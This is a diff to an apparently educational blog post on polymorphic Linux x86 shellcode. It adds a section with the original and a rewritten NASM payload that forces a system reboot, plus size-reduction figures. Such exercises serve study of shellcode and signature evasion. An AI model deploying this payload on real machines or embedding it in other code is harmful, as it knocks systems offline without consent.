@@ -118,7 +118,7 @@ This is a shellcode which will create a directory named "HACK"(modifiable), set 
 The modifications made for creating the polymorphic shellcode are as follows:
 
 1. Removed the XOR'ing of EAX for the exit syscall because we don't really need that.
-1. Removed the INC of CX by 1 before syscall of mkdir because again it is unnecessary in this scenario.
+1. Removed the INC of CX by 1 before syscall of mkdir as an optional argument because again it is not strictly necessary.
 
 There isn't much left to further decrease the size but hey we did decrease it by 14%.
 
@@ -127,6 +127,45 @@ Let's see a demo of the shellcode in action now:
 <script id="asciicast-rhGNnD45lsmXLIXTluTbKOB49" src="https://asciinema.org/a/rhGNnD45lsmXLIXTluTbKOB49.js" async></script>
 
 ## Third polymorphic shellcode - force system reboot 
+[Here](http://shell-storm.org/shellcode/files/shellcode-831.php) is the link to the original shellcode.
 
+Original assembly source:
 
+```nasm
+xor eax, eax
+push eax
+push 0x746f6f62
+push 0x65722f6e
+push 0x6962732f
+mov ebx, esp
+push eax
+push word 0x662d
+mov esi, esp
+push eax
+push esi
+push ebx
+mov ecx, esp
+mov al, 0xb
+int 0x80
+```
+
+Polymorphic assembly source:
+
+```nasm
+xor eax, eax            ; Clearing the EAX register
+xor ebx, ebx            ; Clearing the EBX register
+xor ecx, ecx            ; Clearing the ECX register
+cdq                     ; Clearing the EDX register
+mov al, 0x58            ; Loading syscall value = 0x58 for reboot in AL
+mov ebx, 0xfee1dead     ; Loading magic 1 in EBX
+mov ecx, 672274793      ; Loading magic 2 in ECX
+mov edx, 0x1234567      ; Loading cmd val = LINUX_REBOOT_CMD_RESTART in EDX
+int 0x80                ; Executing the reboot syscall
+```
+
+Length of original shellcode: `36 bytes`
+
+Length of polymorphic shellcode: `26 bytes`
+
+Size Reduction: `28%`
 
